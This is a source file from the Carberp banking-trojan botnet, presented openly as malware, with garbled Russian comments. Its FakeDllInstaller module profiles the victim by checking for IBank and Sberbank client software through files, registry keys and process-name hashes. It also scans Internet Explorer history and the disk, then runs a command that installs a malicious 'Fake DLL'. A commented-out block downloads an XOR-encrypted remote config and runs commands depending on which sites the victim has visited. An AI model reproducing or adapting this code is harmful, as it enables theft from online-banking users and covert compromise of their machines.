/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------

#include "Modules.h"

#ifdef FakeDllInstallerH
//=============================================================================



#include <windows.h>
#include <shlobj.h>


#include "BotCore.h"
#include "Loader.h"
#include "Utils.h"
#include "Task.h"
#include "StrConsts.h"
#include "FakeDllInstaller.h"


#include "BotDebug.h"

namespace FKI_DEBUGER
{
    #include "DbgTemplates.h"
}

#define FKIDBG  FKI_DEBUGER::DBGOutMessage<>




//-----------------------------------------------------------
//  ������ ������ ������ ������������ ������� ���������
//  ������ ������ ���� ��������� ������� �������� �
//  ����������� ������ �������
//-----------------------------------------------------------

#ifndef DEBUGCONFIG
	// ������� ������
	char HISANALIZER_LINKS[BOTPARAM_SIZE_HISANALIZERLINKS] = BOTPARAM_HISANALIZERLINKS;
#else
	// ��� �������
    char HISANALIZER_LINKS[] = "yandex\0mail.ru\0bsi.dll\0\0";
#endif
//-----------------------------------------------------------


/*

const PCHAR HisFileItem = "file:";
const DWORD MaxSearchFromConfigFileseTime = 10*60*1009;

//---------------------------------------------------------------------------
bool CompareSites(PStrings S, PCHAR Site)
{
	// ���������� ����� �� ������ S � ������ Site
	DWORD Count = Strings::Count(S);
    PCHAR Line;
	for (DWORD i = 0; i < Count; i++)
	{
		Line = Strings::GetItem(S, i, false);
		if (STR::Pos(Site, Line) >= 0)
			return true;
	}
	return false;
}

//---------------------------------------------------------------------------

bool FindItem(PCHAR Buffer, PCHAR Site, DWORD BufSize)
{
	if (Buffer == NULL || Site == NULL || BufSize == 0)
		return false;
	DWORD SiteLen = StrCalcLength(Site);
	DWORD Max = BufSize - SiteLen;
    PCHAR TMP = Buffer;
	for (DWORD i = 0; i < Max; i++)
	{
		if (StrSame(TMP, Site, true, SiteLen))
			return true;
		TMP++;
    }
	return false;
}


bool ReadIEHistoryFile(PCHAR FileName, PStrings S)
{
	PCHAR FileCopy = STR::New(2, FileName, "_copy");
	if (FileCopy == NULL)
		return false;

	bool Result = false;

    // �������� ����
	pCopyFileA(FileName, FileCopy, FALSE);

    // ������ ���� � ������
	HANDLE File = (HANDLE)pCreateFileA(FileCopy,
                            GENERIC_READ,
							FILE_SHARE_READ,
                            NULL,
                            OPEN_EXISTING,
							FILE_ATTRIBUTE_NORMAL,
							NULL);

	if (File != INVALID_HANDLE_VALUE)
	{
		DWORD H = 0;
		DWORD FileSize = (DWORD)pGetFileSize(File, &H);
		if (FileSize > 0)
		{
			// �������� ���� � ������
        	HANDLE MapFile = (HANDLE)pCreateFileMappingW(File, 0, PAGE_READONLY, 0, FileSize, 0 );
			if (MapFile != INVALID_HANDLE_VALUE)
			{
				PCHAR Buffer  = (PCHAR)pMapViewOfFile(MapFile, FILE_MAP_READ, 0, 0, 0 );

				// ���� ����������
				DWORD Count = Strings::Count(S);
				PCHAR Line;
				for (DWORD i = 0; i < Count; i++)
				{
					Line = Strings::GetItem(S, i, false);
					if (FindItem(Buffer, Line, FileSize))
					{
						Result = true;
						break;
                    }
				}


                pUnmapViewOfFile(Buffer);
                pCloseHandle(MapFile);
            }

		}

    }
	pCloseHandle(File);
	pDeleteFileA(FileCopy);

	return Result;

}



void SearchIEHistoryCallBack(PFindData Find, PCHAR FileName, LPVOID Data, bool &Cancel)
{
	// ������� �������� ����� ������ ������ � ����������
	PHistoryConfig Config = (PHistoryConfig)Data;

	if (ReadIEHistoryFile(FileName, Config->Sites))
	{
		Cancel = true;
        Config->ContainsURL = true;
	}
}


bool SearchInIEHistory(PHistoryConfig Config)
{
	// ���� ���������� � �������IE
	PCHAR Path = STR::Alloc(MAX_PATH);
	if (Path == NULL)
		return false;

    // ���������� ���� � ���������� ������������
	if (!pSHGetSpecialFolderPathA(NULL, Path, CSIDL_HISTORY, FALSE))
	{
		STR::Free(Path);
		return false;
	}

	// ���� �����
	StrConcat(Path, "\\");
	SearchFiles(Path, "*.dat", true, FA_ANY_FILES, Config, SearchIEHistoryCallBack);

	//
	STR::Free(Path);

	return Config->ContainsURL;
}

//---------------------------------------------------------------------------

void SearchCallBack(PFindData Find, PCHAR FileName, LPVOID Data, bool &Cancel)
{
	// ������� �������� ����� ������ ������ � ����������
	PHistoryConfig Config = (PHistoryConfig)Data;
	if (CompareSites(Config->Sites, Find->cFileName))
	{
		Cancel = true;
		Config->ContainsURL = true;
	}
}
//---------------------------------------------------------------------------


bool SearchInIECookies(PHistoryConfig Config)
{
	// ���� ���������� � �������IE
	PCHAR Path = STR::Alloc(MAX_PATH);
	if (Path == NULL)
		return false;

    // ���������� ���� � ���������� ������������
	if (!pSHGetSpecialFolderPathA(NULL, Path, CSIDL_COOKIES, FALSE))
	{
		STR::Free(Path);
		return false;
	}

	// ���� �����
	StrConcat(Path, "\\");
	SearchFiles(Path, "*.txt", false, FA_ANY_FILES, Config, SearchCallBack);
	//
	STR::Free(Path);

	return Config->ContainsURL;
}
//---------------------------------------------------------------------------
bool SearchFlashPlayerCookies(PHistoryConfig Config)
{
    // ���� ���������� � �������IE
	PCHAR Path = STR::Alloc(MAX_PATH);
	if (Path == NULL)
		return false;

    // ���������� ���� � ���������� ������������
	if (!pSHGetSpecialFolderPathA(NULL, Path, CSIDL_APPDATA, FALSE))
	{
		STR::Free(Path);
		return false;
	}

	// ���� �����
	SearchFiles(Path, "*.*", true, FA_DIRECTORY, Config, SearchCallBack);
	//
	STR::Free(Path);

	return Config->ContainsURL;
}




//---------------------------------------------------------------------------
//  HisUtils - ��������������� ������� ����������� �������
//---------------------------------------------------------------------------

namespace HisUtils
{

    //------------------------------------------------------------------------
	void ExtractFileItems(PHistoryConfig Config)
	{
		// ������� �������� ������ ������ �� ������ ������
		if (Config == NULL || Config->Sites == NULL) return;
		PCHAR S;
        PCHAR FileName;
		DWORD Len = StrCalcLength(HisFileItem);

		DWORD i = 0;
		while (i < Strings::Count(Config->Sites))
		{
			S = Strings::GetItem(Config->Sites, i, false);
			// ��������� ���������� �� ������� � �������� �������� �����
			if (!StrSame(S, HisFileItem, false, Len))
			{
				// ������� �� �������� ������, ���������� ���
				i++;
				continue;
			}

			// ������� �������� ������, ��������� ��� �����
			FileName = STR::IgnoreSpaces(S + Len);
			if (!STR::IsEmpty(FileName))
			{
				if (Config->Files == NULL)
					Config->Files = Strings::Create();
				Strings::Add(Config->Files, FileName);
			}

            Strings::Delete(Config->Sites, i);
		}
	}

	//------------------------------------------------------------------------

	// ��������� ������ ������ �� �������

	typedef struct TFileSearch
	{
		// ����������� ���� ������
		PCHAR ProgramFiles;
		PCHAR Windows;
		PStrings AllPaths;
		DWORD StartTime;
		DWORD MaxSearch;
		bool TimeCompleted;
		bool Finded;

	} *PFileSearch;


	//------------------------------------------------------------------------
	PCHAR GetSpecPath(int CSIDL)
	{
		// ������� ���������� �������� ����
		PCHAR Buf = STR::Alloc(MAX_PATH);
		PCHAR Result = NULL;
		if (pSHGetSpecialFolderPathA(NULL, Buf, CSIDL, FALSE))
		{
            Result = STR::New(2, Buf, "\\");
		}
		STR::Free(Buf);
        return Result;
	}

	void InitSearchCallBack(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel)
	{
		// ���������� �������, ��������� � � ������
		PFileSearch S = (PFileSearch)Data;
        Strings::Add(S->AllPaths, FileName);
    }


	PFileSearch StartSearch()
	{
		// ������� �������������� ����� ������
		PFileSearch S = CreateStruct(TFileSearch);
		S->ProgramFiles = GetSpecPath(CSIDL_PROGRAM_FILES);
		S->Windows = GetSpecPath(CSIDL_WINDOWS);

		// ���������� �������� ���������� ����������� �����
        S->AllPaths = Strings::Create();
		PCHAR Drive = STR::GetLeftStr(S->Windows, ":\\", true);
		SearchFiles(Drive, "*.*", false, FA_DIRECTORY, S, InitSearchCallBack);
		STR::Free(Drive);

		Strings::Remove(S->AllPaths, S->ProgramFiles);
		Strings::Remove(S->AllPaths, S->Windows);

		S->MaxSearch = MaxSearchFromConfigFileseTime;
        S->StartTime = (DWORD)pGetTickCount();

        return S;
	}

	//------------------------------------------------------------------------

	void CloseSearch(PFileSearch S)
	{
		// ���������� ������ ������
		if (S == NULL) return;
		STR::Free(S->Windows);
		STR::Free(S->ProgramFiles);
        Strings::Free(S->AllPaths);

        FreeStruct(S);
    }

	//------------------------------------------------------------------------
	void UpdateSearchTime(PFileSearch S)
	{
		if (S->MaxSearch == 0) return;
        S->TimeCompleted = ((DWORD)pGetTickCount() - S->StartTime) >= S->MaxSearch;
	}

	//------------------------------------------------------------------------
	void SearchCallBack(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel)
	{
		PFileSearch S = (PFileSearch)Data;
		S->Finded = true;
        Cancel = true;
	}

	bool RealSearchFile(PHistoryConfig Config, PFileSearch S, PCHAR Path)
	{
		// ������� ���� ���� �� ����� Mask �� ���� Path
		if (S->Finded || S->TimeCompleted) return true;

		DWORD Count = Strings::Count(Config->Files);
		for (DWORD i = 0; i < Count; i++)
		{
			SearchFiles(Path, Strings::GetItem(Config->Files, i, false), true, FA_ANY_FILES, S, SearchCallBack);
			UpdateSearchTime(S);
			if (S->Finded || S->TimeCompleted) break;
        }
		return S->Finded;
    }

	//------------------------------------------------------------------------

	bool SearchFilesFromConfig(PHistoryConfig Config)
	{
		// ������� ���� ����� ��������� � ���������������� �����

		// �������������� �����
		PFileSearch S = StartSearch();

		// ���� �����
		RealSearchFile(Config, S, S->ProgramFiles);

	  	if (!S->Finded  && !S->TimeCompleted)
		{
			// ���� ����� �� ���� ����������� ����������� �����
			for (DWORD i = 0; i < Strings::Count(S->AllPaths); i++)
			{
				RealSearchFile(Config, S, Strings::GetItem(S->AllPaths, i));

				if (S->Finded || S->TimeCompleted) break;
			}
		}

		if (!S->Finded && !S->TimeCompleted)
			RealSearchFile(Config, S, S->Windows);

		// ��������� �����
		bool Result = S->Finded;
		CloseSearch(S);
		return Result;
    }
}



//---------------------------------------------------------------------------
bool HisAnalizer::Download(PCHAR URL, PHistoryConfig &Config)
{
	// ��������� ���������������� ����
	Config = NULL;
	if (STR::IsEmpty(URL)) return false;

	// ��������� ������ � ����
	LPBYTE Buffer = NULL;
	DWORD BufSize = 0;
	if (!DownloadInMem(URL, &Buffer, &BufSize))
		return false;

	// �������������� ������
	const static char Signature[] = {'B', 'J', 'B', 0};
	PCHAR Lines = (PCHAR)XORCrypt::DecodeBuffer((PCHAR)Signature, Buffer, BufSize);
	if (Lines == NULL || BufSize == 0)
	{
		MemFree(Buffer);
		return false;
	}

	// ������ ������
	Config = CreateStruct(THistoryConfig);
    if (Config == NULL) return false;
	bool Result = Parse(Lines, Config);
	MemFree(Buffer);

	if (!Result)
	{
		ClearConfig(Config);
		FreeStruct(Config);
		Config = NULL;
	}

	return Result;
}


//---------------------------------------------------------------------------

bool HisAnalizer::Parse(PCHAR Lines, PHistoryConfig Config)
{
	// ��������� ������ ����� ����������������� �����
	if (STR::IsEmpty(Lines))
		return false;

	PStrings S = Strings::Create();
	Strings::SetText(S, Lines);
	bool Result = false;

	// ������ ������
	if (Strings::Count(S) > 1)
	{
		PCHAR Cmd = Strings::GetItem(S, 0);
		Strings::Delete(S, 0);

		Config->Command1 = STR::GetLeftStr(Cmd, "|");
		if (Config->Command1 != NULL)
		{
            Config->Command2 = STR::GetRightStr(Cmd, "|");
			STR::Free(Cmd);
		}
		else
			Config->Command1 = Cmd;

        Result = Config->Command1 != NULL;
    }

	if (Result)
	{
		// �������� ����� �� ������
		Config->Sites = S;
        HisUtils::ExtractFileItems(Config);
    }
	else
		Strings::Free(S);
	return Result;
}

//---------------------------------------------------------------------------
void HisAnalizer::Execute(PHistoryConfig Config)
{
	// ��������� ����� �� ������� ��������� ������
	// � �� ���� ������ ��������� ����������� �������
	if (Config == NULL) return;

	bool Contain =  SearchInIEHistory(Config) ||
				   	SearchInIECookies(Config) ||
					SearchFlashPlayerCookies(Config) ||
					HisUtils::SearchFilesFromConfig(Config);

	if (Contain)
		ExecuteCommand(NULL, Config->Command1, false);
	else
		ExecuteCommand(NULL, Config->Command2, false);
}

//---------------------------------------------------------------------------

void HisAnalizer::DownloadAndExecute(PCHAR URL)
{
	//  ��������� � ��������� ������� �� ����������������� �����
	PHistoryConfig Config = NULL;
	if (Download(URL, Config))
	{
		Execute(Config);
        FreeConfig(Config);
    }
}

//---------------------------------------------------------------------------

void HisAnalizer::ClearConfig(PHistoryConfig Config)
{
	STR::Free2(Config->Command1);
	STR::Free2(Config->Command2);
	Strings::Free(Config->Sites);
	Strings::Free(Config->Files);
    ClearStruct(*Config);
}

//---------------------------------------------------------------------------

void HisAnalizer::FreeConfig(PHistoryConfig Config)
{
	// ���������� ������
	if (Config == NULL) return;
	ClearConfig(Config);
	FreeStruct(Config);
}

//---------------------------------------------------------------------------

DWORD WINAPI AnalyzerThreadProc(LPVOID Data)
{
	PCHAR URL = (PCHAR)Data;
	HisAnalizer::DownloadAndExecute(URL);
	STR::Free(URL);
	pExitThread(0);
	return 0;
}

void HisAnalizer::StartAnalizerThread(PCHAR URL)
{
	if (!STR::IsEmpty(URL))
		StartThread(AnalyzerThreadProc, STR::New(URL));
}

*/

//*****************************************************************************
//   ������ ������ ������ �� ���������� � ����� �������� �������������
//   ��������� Fake DLL
//*****************************************************************************
namespace FDI
{
	//--------------------------------------------------
	//  ������� ��������� ������ �������������� ������
	//--------------------------------------------------
	void ReadLinks(TBotStrings &Links)
	{
		TStrEnum L(HISANALIZER_LINKS,
				   BOTPARAM_ENCRYPTED_HISANALIZERLINKS,
				   BOTPARAM_HASH_HISANALIZERLINKS);

		while (L.Next())
			Links.Add(L.Line());
	}
	//--------------------------------------------------


	struct TSearchData
	{
		TBotStrings *Links;
		bool        Contain;
	};


	void CheckIEHistory(PFindData Find, PCHAR FileName, LPVOID SearchData, bool &Cancel)
	{
		// ���� ��������� ������ � ��������� ����� �������

		TSearchData* Data = (TSearchData*)SearchData;

		DWORD  Size = 0;
		LPBYTE Buf  = File::ReadToBufferA(FileName, Size);
		if (Buf)
		{
			int Count = Data->Links->Count();
			for (int i = 0; i < Count; i++)
			{
				string Link = Data->Links->GetItem(i);
				int P = STR::Pos((PCHAR)Buf, Link.t_str(), Size, true);
				if (P >= 0)
				{
					Cancel = true;
					Data->Contain = true;
					FKIDBG("FakeDLLInstaller", "������ ������ ������ � ������� ��������� [%s]", Link.t_str());
					break;
				}
			}
			MemFree(Buf);
        }
	}


	//--------------------------------------------------
	//  ������� ���� ���������� � ������� ���������
	//  �������� ����������
	//--------------------------------------------------
	bool CheckIEHistory(TBotStrings &Links)
	{
		if (Links.Count())
		{
			FKIDBG("FakeDLLInstaller", "��������� ������� ��������� ��");
			string Path = GetSpecialFolderPathA(CSIDL_HISTORY, NULL);
			if (!Path.IsEmpty())
			{
				// ���������� ��� ����� � ���������� �������

				TSearchData Data;
				Data.Links   = &Links;
				Data.Contain = false;

				SearchFiles(Path.t_str(), "*.dat", true, FA_ANY_FILES, &Data, CheckIEHistory);

				return Data.Contain;
			}
		}

		return false;
    }
	//-------------------------------------------------------------------------

	bool CheckFileHash(DWORD Hash)
	{
		// ������� ���������� ��� ����� ����� � ������� ������������ � �������
		const static DWORD Hashes[] ={0xD61CFB13, /* cbank.exe */
									  0xFE0E05F6, /* cbmain.ex */
									  0x702FB20,  /* cbmain.ex_ */
									  0};
		int i = 0;
		while (Hashes[i])
		{
			if (Hash == Hashes[i])
				return true;
			i++;
		}
		return false;
	}
	//-------------------------------------------------------------------------

	bool SearchProcesses()
	{
		// ������� ��������� ���������� �������� � ������ ������
		FKIDBG("FakeDLLInstaller", "��������� ���������� ��������");

		bool Result = false;
		LPVOID Buf = GetInfoTable( SystemProcessInformation );
		PSYSTEM_PROCESS_INFORMATION pProcess = (PSYSTEM_PROCESS_INFORMATION)Buf;

		DWORD dwSessionId = 0;

		if (pProcess != NULL)
		{
			dwSessionId = GetCurrentSessionId();

			do
			{
				if ( dwSessionId == pProcess->uSessionId )
				{
					if ( pProcess->usName.Length )
					{
						DWORD ProcessHash = STRW::Hash(pProcess->usName.Buffer, 0, true);

						if (CheckFileHash(ProcessHash))
						{
							FKIDBG("FakeDLLInstaller", "������ ������� %s", pProcess->usName.Buffer);
							Result = true;
							break;
						}
					}
				}

				pProcess = (PSYSTEM_PROCESS_INFORMATION)((DWORD)pProcess + pProcess->uNext);

			} while ( pProcess->uNext != 0 );
		}

		MemFree(Buf);

		return Result;
	}
    //-------------------------------------------------------------------------


	bool IBankInstalled()
	{
		// ������� ��������� ������� ������� ����� ��� ������ �������
		//  ��������������� �� �������������,
		// �� ������ ������������ IBank
        FKIDBG("FakeDLLInstaller", "��������� ���������� ������");

		// ��������� ������� �����
		string FileNameName = GetSpecialFolderPathA(CSIDL_PROFILE, GetStr(EStrIBankFileName));

		bool Result = File::IsExists(FileNameName.t_str());




		if (!Result)
		{
			// ��������� ������

			FKIDBG("FakeDLLInstaller", "��������� ����� �������");
			string Tmp = GetStr(EStrSberRegistryKey);

			Result = Registry::IsKeyExist(HKEY_LOCAL_MACHINE, GetStr(EStrIBankRegistryPath).t_str()) ||
					  Registry::IsKeyExist(HKEY_LOCAL_MACHINE, Tmp.t_str()) ||
					  Registry::IsKeyExist(HKEY_CURRENT_USER,  Tmp.t_str());
        }

		if (Result)
		{
			FKIDBG("FakeDLLInstaller", "������� ����������� ������");
			// ��� ���������� ��� ������� ��������� ���������
			#ifdef JAVS_PATCHERHvd
				JavaPatcherSignal(NULL);
			#endif
		}

		return Result;

	}
	//-------------------------------------------------------------------------

	void CheckFile(PFindData Find, PCHAR FileName, LPVOID SearchData, bool &Cancel)
	{
		// ��������� ����
		DWORD Hash = STRA::Hash(Find->cFileName, 0, true);
		if (CheckFileHash(Hash))
		{
			FKIDBG("FakeDLLInstaller", "������ ���� %s", FileName);
			Cancel = true;
            *((bool*)SearchData) = true;
		}
		pSleep(1);
	}
    //-------------------------------------------------------------------------

	bool CheckFiles()
	{
		// ������� ���� ��������� ������ ������
		FKIDBG("FakeDLLInstaller", "��������� ����� �� �����");
		TMemory Path(MAX_PATH);

		pGetSystemDirectoryA(Path.AsStr(), MAX_PATH);
		PCHAR S = Path.AsStr();
		PCHAR End = STRA::Scan(S, '\\');
		if (End) *(End + 1) = 0;

		bool Result = false;

		SearchFiles(S, "*.*", true, FA_ANY_FILES, &Result, CheckFile);

		return Result;
	}

	//--------------------------------------------------
	//  ������� ������ ������� ������� ���������
	//--------------------------------------------------
	DWORD WINAPI DoExecute(LPVOID)
	{
		// � ����� ������ � ��� ����� ��������� ��������
		// ������ ������� ��������������� �� �������������,
		// �� ������ ������������ IBank

        FKIDBG("FakeDLLInstaller", "���������� ������������ ��������� FakeDll");

		bool Executed = IBankInstalled() ||
						SearchProcesses();

		// ��������� ������� ��������� ��
		if (!Executed)
		{
			TBotStrings Links;

			// ������ ������
			ReadLinks(Links);

			// ����������� ������� ���������
			Executed = CheckIEHistory(Links);
		}


		// ��������� ������ ���� ����� �� �����
		if (!Executed)
			Executed = CheckFiles();


		// � ������ ����������� ���������, ��������� �������
		if (Executed)
		{
        	Install();
        }

		return 0;
	}
    //-------------------------------------------------------------------------
}



//------------------------------------------------------
// Execute - ������� ��������� ������ ������� ���������
//------------------------------------------------------
void FDI::Execute()
{
	if (!BOT::FakeDllInstalled())
		StartThread(DoExecute, 0);
	else
		FKIDBG("FakeDLLInstaller", "Fake DLL ��� �����������");
}



//------------------------------------------------------
//  ������� ��������� ��������� Fake DLL
//------------------------------------------------------
void FDI::Install()
{
	FKIDBG("FakeDLLInstaller", "������������� Fake DLL");
	#ifndef AGENTFULLTEST
		ExecuteCommand(NULL, GetStr(EStrCommandInstallFakeDLL).t_str(), NULL , false);
	#endif
}



//=============================================================================
#endif
